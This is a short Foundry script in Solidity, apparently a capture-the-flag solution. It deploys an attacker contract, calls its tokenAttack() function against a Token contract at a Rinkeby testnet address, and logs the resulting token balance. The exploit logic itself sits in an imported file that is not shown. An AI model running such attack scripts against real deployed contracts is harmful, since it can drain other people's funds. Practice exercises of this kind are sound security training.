// SPDX-License-Identifier: UNLICENSED

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { Token } from "src/Token/Token.sol";
import { TokenAttack } from "src/Token/TokenAttack.sol";

contract TokenAttackScript is Script {
    // affected contract: https://rinkeby.etherscan.io/address/0x97058602c047be0e21a85094204b5c9e3ce76dbb#internaltx

    function run() public {
        vm.startBroadcast();
            // create new attacker and then attack
            TokenAttack tokenAttacker = new TokenAttack();
            tokenAttacker.tokenAttack();
            // check balances of on-chain token
            Token token = Token(address(0x97058602C047Be0E21a85094204b5c9E3Ce76DBB));
            console.logString("FINAL BALANCE:::");
            console.log(token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}